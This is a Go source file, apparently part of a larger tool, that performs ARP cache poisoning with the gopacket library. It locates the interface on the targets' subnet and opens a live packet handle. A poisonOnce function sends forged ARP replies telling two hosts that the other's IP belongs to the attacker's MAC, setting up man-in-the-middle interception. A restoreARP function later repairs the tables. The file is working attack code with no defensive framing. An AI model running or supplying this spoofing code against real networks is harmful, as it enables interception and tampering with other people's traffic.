package main

import (
	"errors"
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const arpInterval = 2 * time.Second

var (
	pcapHandle *pcap.Handle
	myMAC      net.HardwareAddr
	myIP       net.IP
	ifaceName  string
)

func setupInterface() error {
	ifaces, err := net.Interfaces()
	if err != nil {
		return err
	}
	for _, i := range ifaces {
		if i.Flags&net.FlagUp == 0 || i.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := i.Addrs()
		for _, a := range addrs {
			ipnet, ok := a.(*net.IPNet)
			if !ok {
				continue
			}
			v4 := ipnet.IP.To4()
			if v4 == nil {
				continue
			}
			if ipnet.Contains(srcIP) || ipnet.Contains(dstIP) {
				ifaceName = i.Name
				myMAC = i.HardwareAddr
				myIP = v4
				return nil
			}
		}
	}
	return errors.New("no interface found whose subnet contains the targets")
}

func openPcap() error {
	h, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	pcapHandle = h
	return nil
}

func craftARP(senderIP net.IP, senderMAC net.HardwareAddr,
	targetIP net.IP, targetMAC net.HardwareAddr) ([]byte, error) {
	eth := layers.Ethernet{
		SrcMAC:       senderMAC,
		DstMAC:       targetMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(senderMAC),
		SourceProtAddress: []byte(senderIP.To4()),
		DstHwAddress:      []byte(targetMAC),
		DstProtAddress:    []byte(targetIP.To4()),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func poisonOnce() error {
	pkt1, err := craftARP(srcIP, myMAC, dstIP, dstMAC)
	if err != nil {
		return err
	}
	if err := pcapHandle.WritePacketData(pkt1); err != nil {
		return err
	}
	pkt2, err := craftARP(dstIP, myMAC, srcIP, srcMAC)
	if err != nil {
		return err
	}
	return pcapHandle.WritePacketData(pkt2)
}

func restoreARP() {
	if pcapHandle == nil {
		return
	}
	fmt.Println("[*] Restoring ARP tables...")
	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	// Gratuitous ARPs to broadcast — Linux's arp_accept logic updates
	// existing REACHABLE entries far more reliably from broadcast frames.
	pkt1, err1 := craftARP(srcIP, srcMAC, dstIP, bcast)
	pkt2, err2 := craftARP(dstIP, dstMAC, srcIP, bcast)
	for i := 0; i < 5; i++ {
		if err1 == nil {
			_ = pcapHandle.WritePacketData(pkt1)
		}
		if err2 == nil {
			_ = pcapHandle.WritePacketData(pkt2)
		}
		time.Sleep(200 * time.Millisecond)
	}
	fmt.Println("[+] ARP tables restored.")
}
